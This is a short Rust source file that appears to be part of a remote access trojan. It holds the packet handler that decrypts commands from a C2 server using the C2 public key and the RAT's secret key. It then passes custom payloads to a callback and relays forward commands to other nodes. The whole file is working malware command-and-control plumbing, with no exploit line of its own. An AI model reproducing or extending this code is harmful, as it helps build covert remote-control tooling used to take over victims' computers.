use crate::{unpack_commands, Command};

extern crate sodiumoxide;
use sodiumoxide::crypto::box_ as crypto;

extern crate bincode;

pub fn commands<FCustom, FSend>(
    cmds: Vec<Command>,
    _rat_skey: &crypto::SecretKey,
    full_bytes: &[u8],
    mut custom: FCustom,
    mut send_message: FSend,
) -> crate::Result<()>
where
    FCustom: FnMut(Vec<u8>),
    FSend: FnMut(String, &[u8]) -> bool,
{
    let mut addons = vec![];
    let mut nexts = vec![];
    for cmd in cmds.into_iter() {
        match cmd {
            crate::Command::Forward(to) => nexts.push(to),
            crate::Command::Custom(c) => custom(c),
        }
    }
    if !nexts.is_empty() {
        // sender_skey: &crypto::SecretKey,
        // cmds: &[(Command, &crypto::PublicKey)],
        addons.extend_from_slice(full_bytes);
        for next in nexts {
            if !send_message(next, &addons) {
                return Err(crate::Error::MessageSendFailed);
            }
        }
    }
    Ok(())
}

pub fn packet<FCustom, FSend>(
    c2_pkey: &crypto::PublicKey,
    rat_skey: &crypto::SecretKey,
    bytes: &[u8],
    custom: FCustom,
    send_message: FSend,
) -> crate::Result<()>
where
    FCustom: FnMut(Vec<u8>),
    FSend: FnMut(String, &[u8]) -> bool,
{
    let unpacked = unpack_commands(c2_pkey, rat_skey, bytes)?;
    commands(unpacked, rat_skey, bytes, custom, send_message)
}
